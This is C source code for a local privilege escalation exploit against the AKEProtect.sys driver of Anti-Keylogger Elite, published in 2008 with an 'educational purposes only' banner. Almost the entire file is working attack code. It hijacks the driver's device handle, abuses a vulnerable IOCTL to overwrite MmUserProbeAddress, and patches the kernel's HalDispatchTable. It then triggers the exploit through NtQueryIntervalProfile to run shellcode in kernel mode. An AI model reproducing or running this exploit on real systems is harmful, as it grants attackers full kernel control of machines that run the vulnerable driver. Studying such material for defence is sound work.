////////////////////////////////////////////////////////////////////////////////////
// +----------------------------------------------------------------------------+ //
// |                                                                            | //
// | ISecSoft, Inc. - http://www.remove-keyloggers.com                          | //
// |                                                                            | //
// | Affected Software:                                                         | //
// | Anti-Keylogger Elite <= 3.3.0                                              | //
// |                                                                            | //
// | Affected Driver:                                                           | //
// | Anti-Keylogger Elite Driver - AKEProtect.sys <= 3.3.3.0                    | //
// |                                                                            | //
// | Local Privilege Escalation Exploit                                         | //
// | For Educational Purposes Only !                                            | //
// |                                                                            | //
// +----------------------------------------------------------------------------+ //
// |                                                                            | //
// | NT Internals - http://www.ntinternals.org/                                 | //
// | alex ntinternals org                                                       | //
// | 27 October 2008                                                            | //
// |                                                                            | //
// | References:                                                                | //
// | Exploiting Common Flaws in Drivers                                         | //
// | Ruben Santamarta - http://reversemode.com/                                 | //
// |                                                                            | //
// +----------------------------------------------------------------------------+ //
////////////////////////////////////////////////////////////////////////////////////

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include "AKEProtect_Exp.h"
#include "InvbShellCode.h"


#define IOCTL_VULNERABLE 0x002224A4

#define INPUT_BUFFER_LENGTH 0x0400


int __cdecl main(int argc, char **argv)
{
    NTSTATUS NtStatus;
    
    ULONG i;
    ULONG AllocationSize = PAGE_SIZE * 64;
    HANDLE ProcessHandle;
    HANDLE DeviceHandle;
    ULONG UniqueProcess;
    
    ULONG ImageBase;
    PVOID MappedBase;
    UCHAR ImageName[KERNEL_NAME_LENGTH];
    ULONG DllCharacteristics = DONT_RESOLVE_DLL_REFERENCES;
    PVOID HalDispatchTable;
    PVOID xHalQuerySystemInformation;
    PVOID MmUserProbeAddress;

    ULONG ShellCodeSize = PAGE_SIZE;
    PVOID ShellCodeAddress;
    PVOID BaseAddress = NULL;
    PVOID Buffer = NULL;
    
    ULONG InputBuffer[INPUT_BUFFER_LENGTH / 4];

    UNICODE_STRING DeviceName;
    UNICODE_STRING DllName;
    ANSI_STRING ProcedureName;
    OBJECT_ATTRIBUTES ObjectAttributes;
    IO_STATUS_BLOCK IoStatusBlock;
    CLIENT_ID ClientId;
    PSYSTEM_PROCESSES ProcessInformation = NULL;
    PSYSTEM_HANDLE_INFORMATION_EX HandleInformation = NULL;
    PSYSTEM_MODULE_INFORMATION_EX ModuleInformation = NULL;
    UCHAR ObjectInformation[OBJECT_NAME_LENGTH];
    LARGE_INTEGER Interval;

    ///////////////////////////////////////////////////////////////////////////////////////////////
    
    system("cls");

    
    NtStatus = NtAllocateVirtualMemory(
                                       NtCurrentProcess(),  // ProcessHandle
                                       &ProcessInformation, // BaseAddress
                                       0,                   // ZeroBits
                                       &AllocationSize,     // AllocationSize
                                       MEM_COMMIT,          // AllocationType
                                       PAGE_READWRITE);     // Protect

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtAllocateVirtualMemory [1] - 0x%.8X\n", NtStatus);    
        return NtStatus;
    }

    HandleInformation = (PSYSTEM_HANDLE_INFORMATION_EX)((PUCHAR)(ProcessInformation));
    ModuleInformation = (PSYSTEM_MODULE_INFORMATION_EX)((PUCHAR)(ProcessInformation));

    ///////////////////////////////////////////////////////////////////////////////////////////////
    
    printf(" +----------------------------------------------------------------------------+\n");

    RtlInitUnicodeString(&DeviceName, L"\\Device\\AKEProtect");

    ObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
    ObjectAttributes.RootDirectory = 0;
    ObjectAttributes.ObjectName = &DeviceName;
    ObjectAttributes.Attributes = OBJ_CASE_INSENSITIVE;
    ObjectAttributes.SecurityDescriptor = NULL;
    ObjectAttributes.SecurityQualityOfService = NULL;

    
    NtStatus = NtCreateFile(
                            &DeviceHandle,                      // FileHandle
                            FILE_READ_DATA | FILE_WRITE_DATA,   // DesiredAccess
                            &ObjectAttributes,                  // ObjectAttributes
                            &IoStatusBlock,                     // IoStatusBlock
                            NULL,                               // AllocationSize OPTIONAL
                            0,                                  // FileAttributes
                            FILE_SHARE_READ | FILE_SHARE_WRITE, // ShareAccess
                            FILE_OPEN_IF,                       // CreateDisposition
                            0,                                  // CreateOptions
                            NULL,                               // EaBuffer OPTIONAL
                            0);                                 // EaLength

    if(NtStatus == STATUS_ACCESS_DENIED)
    {
        NtStatus = NtQuerySystemInformation(
                                            SystemProcessesAndThreadsInformation, // SystemInformationClass
                                            ProcessInformation,                   // SystemInformation
                                            AllocationSize,                       // SystemInformationLength
                                            NULL);                                // ReturnLength

        if(NtStatus)
        {
            printf(" [*] NtStatus of NtQuerySystemInformation [1] - 0x%.8X\n", NtStatus);    
            return NtStatus;
        }

        while(ProcessInformation->NextEntryDelta)
        {
            if(ProcessInformation->ProcessName.Length)
            {
                if((sizeof("AKE.exe")*2) ==
                RtlCompareMemory(ProcessInformation->ProcessName.Buffer, L"AKE.exe", sizeof("AKE.exe")*2))
                {
                    printf(" | ProcessName - %ws                                                      |\n"
                           " | ProcessId - %.4d                                                           |\n",
                           ProcessInformation->ProcessName.Buffer,
                           ProcessInformation->ProcessId);

                    UniqueProcess = ProcessInformation->ProcessId;
                
                    break;
                }
            }

            ProcessInformation = (PSYSTEM_PROCESSES)((PUCHAR)(ProcessInformation) + ProcessInformation->NextEntryDelta);
        }

    
        NtStatus = NtQuerySystemInformation(
                                            SystemHandleInformation,
                                            HandleInformation,
                                            AllocationSize,
                                            NULL);
    
        if(NtStatus)
        {
            printf(" [*] NtStatus of NtQuerySystemInformation [2] - 0x%.8X\n", NtStatus);
            return NtStatus;
        }
    
        ObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
        ObjectAttributes.RootDirectory = 0;
        ObjectAttributes.ObjectName = NULL;
        ObjectAttributes.Attributes = OBJ_CASE_INSENSITIVE;
        ObjectAttributes.SecurityDescriptor = NULL;
        ObjectAttributes.SecurityQualityOfService = NULL;

        ClientId.UniqueProcess = (HANDLE)UniqueProcess;
        ClientId.UniqueThread = 0;

    
        NtStatus = NtOpenProcess(
                                 &ProcessHandle,     // ProcessHandle
                                 PROCESS_DUP_HANDLE, // DesiredAccess
                                 &ObjectAttributes,  // ObjectAttributes
                                 &ClientId);         // ClientId

        if(NtStatus)
        {
            printf(" [*] NtStatus of NtOpenProcess - 0x%.8X\n", NtStatus);
            return NtStatus;
        }
    
        for(i=0; i<(HandleInformation->HandleCount); i++)
        {
            if(HandleInformation->Handles[i].ProcessId == UniqueProcess)
            {
                RtlFillMemory(ObjectInformation, 0, OBJECT_NAME_LENGTH);
        
            
                NtStatus = NtDuplicateObject(
                                             ProcessHandle,                                  // SourceProcessHandle
                                             (HANDLE)(HandleInformation->Handles[i].Handle), // SourceHandle
                                             NtCurrentProcess(),                             // TargetProcessHandle
                                             &DeviceHandle,                                  // DeviceHandle
                                             0,                                              // DesiredAccess
                                             0,                                              // Attributes
                                             DUPLICATE_SAME_ACCESS);                         // Options

                if(NtStatus)
                {
                    printf(" [*] NtStatus of NtDuplicateObject [1] - 0x%.8X\n", NtStatus);
                    return NtStatus;
                }
        
        
                NtStatus = NtQueryObject(
                                         DeviceHandle,          // ObjectHandle
                                         ObjectNameInformation, // ObjectInformationClass
                                         ObjectInformation,     // ObjectInformation
                                         OBJECT_NAME_LENGTH,    // ObjectInformationLength
                                         NULL);                 // ReturnLength

                if(NtStatus)
                {
                    printf(" [*] NtStatus of NtQueryObject - 0x%.8X\n", NtStatus);
                    return NtStatus;
                }

            
                NtStatus = NtClose(DeviceHandle); // Handle

                if(NtStatus)
                {
                    printf(" [*] NtStatus of NtClose [1] - 0x%.8X\n", NtStatus);
                    return NtStatus;
                }
            
                if(((POBJECT_NAME_INFORMATION)ObjectInformation)->Name.Length)
                {
                    if((sizeof("\\Device\\AKEProtect")*2) ==
                    RtlCompareMemory(((POBJECT_NAME_INFORMATION)ObjectInformation)->Name.Buffer,
                    L"\\Device\\AKEProtect", sizeof("\\Device\\AKEProtect")*2))
                    {
                        NtStatus = NtDuplicateObject(
                                                     ProcessHandle,
                                                     (HANDLE)(HandleInformation->Handles[i].Handle),
                                                     NtCurrentProcess(),
                                                     &DeviceHandle,
                                                     0,
                                                     0,
                                                     DUPLICATE_CLOSE_SOURCE);

                        if(NtStatus)
                        {
                            printf(" [*] NtStatus of NtDuplicateObject [2] - 0x%.8X\n", NtStatus);
                            return NtStatus;
                        }

                        printf(" | Object - 0x%.8X                                                        |\n"
                               " | ObjectName - %ws                                        |\n",
                               HandleInformation->Handles[i].Object,
                               ((POBJECT_NAME_INFORMATION)ObjectInformation)->Name.Buffer);

                        break;
                    }
                }
            }
        }

        NtStatus = NtClose(ProcessHandle);

        if(NtStatus)
        {
            printf(" [*] NtStatus of NtClose [2] - 0x%.8X\n", NtStatus);
            return NtStatus;
        }


        NtStatus = NtFreeVirtualMemory(
                                       NtCurrentProcess(), // ProcessHandle
                                       &HandleInformation, // BaseAddress
                                       &AllocationSize,    // FreeSize
                                       MEM_DECOMMIT);      // FreeType
            
        if(NtStatus)
        {
            printf(" [*] NtStatus of NtFreeVirtualMemory - 0x%.8X\n", NtStatus);
            return NtStatus;
        }
    }
    else if(NtStatus)
    {
        printf(" [*] NtStatus of NtCreateFile - 0x%.8X\n", NtStatus);    
        return NtStatus;
    }

    RtlFreeUnicodeString(&DeviceName);

    printf(" | DeviceHandle - 0x%.8X                                                  |\n"
           " +----------------------------------------------------------------------------+\n",
            DeviceHandle);

    ///////////////////////////////////////////////////////////////////////////////////////////////
        
    NtStatus = NtQuerySystemInformation(
                                        SystemModuleInformation,
                                        (PSYSTEM_MODULE_INFORMATION_EX)ModuleInformation,
                                        AllocationSize,
                                        NULL);
    if(NtStatus)
    {
        printf(" [*] NtStatus of NtQuerySystemInformation [3] - 0x%.8X\n", NtStatus);
        return NtStatus;
    }
        
    ImageBase = (ULONG)(ModuleInformation->Modules[0].Base);


    RtlMoveMemory(
                  ImageName,
                  (PVOID)(ModuleInformation->Modules[0].ImageName + ModuleInformation->Modules[0].ModuleNameOffset),
                  KERNEL_NAME_LENGTH);

    printf( " +----------------------------------------------------------------------------+\n"
            " | ImageBase - 0x%.8X                                                     |\n"
            " | ImageName - %s                                                   |\n",
            ImageBase,
            ImageName);


    NtStatus = NtFreeVirtualMemory(
                                   NtCurrentProcess(), // ProcessHandle
                                   &ModuleInformation, // BaseAddress
                                   &AllocationSize,    // FreeSize
                                   MEM_DECOMMIT);      // FreeType

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtFreeVirtualMemory [1] - 0x%.8X\n", NtStatus);
        return NtStatus;
    }

    ///////////////////////////////////////////////////////////////////////////////////////////////

    RtlCreateUnicodeStringFromAsciiz(&DllName, (PUCHAR)ImageName);


    NtStatus = LdrLoadDll(
                          NULL,                // DllPath
                          &DllCharacteristics, // DllCharacteristics
                          &DllName,            // DllName
                          &MappedBase);        // DllHandle

    if(NtStatus)
    {
        printf(" [*] NtStatus of LdrLoadDll - 0x%.8X\n", NtStatus);    
        return NtStatus;
    }

    ///////////////////////////////////////////////////////////////////////////////////////////////

    RtlInitAnsiString(&ProcedureName, "HalDispatchTable");


    NtStatus = LdrGetProcedureAddress(
                                      (PVOID)MappedBase,          // DllHandle
                                      &ProcedureName,             // ProcedureName
                                      0,                          // ProcedureNumber OPTIONAL
                                      (PVOID*)&HalDispatchTable); // ProcedureAddress

    if(NtStatus)
    {
        printf(" [*] NtStatus of LdrGetProcedureAddress [1] - 0x%.8X\n", NtStatus);    
        return NtStatus;
    }

    (ULONG)HalDispatchTable -= (ULONG)MappedBase;
    (ULONG)HalDispatchTable += ImageBase;

    (ULONG)xHalQuerySystemInformation = (ULONG)HalDispatchTable + sizeof(ULONG);

    ///////////////////////////////////////////////////////////////////////////////////////////////

    RtlInitAnsiString(&ProcedureName, "MmUserProbeAddress");


    NtStatus = LdrGetProcedureAddress(
                                      (PVOID)MappedBase,
                                      &ProcedureName,
                                      0,
                                      (PVOID*)&MmUserProbeAddress);

    if(NtStatus)
    {
        printf(" [*] NtStatus of LdrGetProcedureAddress [2] - 0x%.8X\n", NtStatus);    
        return NtStatus;
    }

    (ULONG)MmUserProbeAddress -= (ULONG)MappedBase;
    (ULONG)MmUserProbeAddress += ImageBase;

    ///////////////////////////////////////////////////////////////////////////////////////////////

    printf( " |                                                                            |\n"
            " | HalDispatchTable - 0x%.8X                                              |\n"
            " | xHalQuerySystemInformation - 0x%.8X                                    |\n"
            " | MmUserProbeAddress - 0x%.8X                                            |\n"
            " +----------------------------------------------------------------------------+\n",
            HalDispatchTable,
            xHalQuerySystemInformation,
            MmUserProbeAddress);


    NtStatus = XxInitInbv(ImageBase, (ULONG)MappedBase);

	if(NtStatus)
	{
		printf(" [*] NtStatus of XxInitInbv - 0x%.8X\n", NtStatus);	
		return NtStatus;
	}

    RtlFreeUnicodeString(&DllName);
    RtlFreeAnsiString(&ProcedureName);

    LdrUnloadDll((PVOID)MappedBase);

    ///////////////////////////////////////////////////////////////////////////////////////////////

    NtStatus = NtDeviceIoControlFile(
                                     DeviceHandle,
                                     NULL,
                                     NULL,
                                     NULL,
                                     &IoStatusBlock,
                                     IOCTL_VULNERABLE,
                                     InputBuffer,
                                     0x400,
                                     (PUCHAR)MmUserProbeAddress,
                                     0);

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtDeviceIoControlFile - 0x%.8X\n", NtStatus);
        return NtStatus;
    }


    NtStatus = NtOpenSection(
                             (PHANDLE)xHalQuerySystemInformation, // SectionHandle
                             0,                                   // DesiredAccess
                             NULL);                               // ObjectAttributes


    ///////////////////////////////////////////////////////////////////////////////////////////////

    ShellCodeAddress = (PVOID)sizeof(ULONG);


    NtStatus = NtAllocateVirtualMemory(
                                       NtCurrentProcess(),
                                       &ShellCodeAddress,
                                       0,
                                       &ShellCodeSize,
                                       MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,
                                       PAGE_EXECUTE_READWRITE);

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtAllocateVirtualMemory [2] - 0x%.8X\n", NtStatus);    
        return NtStatus;
    }

    RtlMoveMemory(ShellCodeAddress, (PVOID)InbvShellCode, ShellCodeSize);


    Interval.LowPart = 0xFF676980;
    Interval.HighPart = 0xFFFFFFFF;

    printf("\n 3");
    NtDelayExecution(FALSE, &Interval);

    printf(" 2");
    NtDelayExecution(FALSE, &Interval);

    printf(" 1");
    NtDelayExecution(FALSE, &Interval);

    printf(" Hoop\n\n");
    NtDelayExecution(FALSE, &Interval);


    NtStatus = NtQueryIntervalProfile(
                                      ProfileTotalIssues, // Source
                                      NULL);              // Interval

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtQueryIntervalProfile - 0x%.8X\n", NtStatus);
        return NtStatus;
    }
    

    NtStatus = NtClose(DeviceHandle);

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtClose - 0x%.8X\n", NtStatus);    
        return NtStatus;
    }

    return FALSE;
}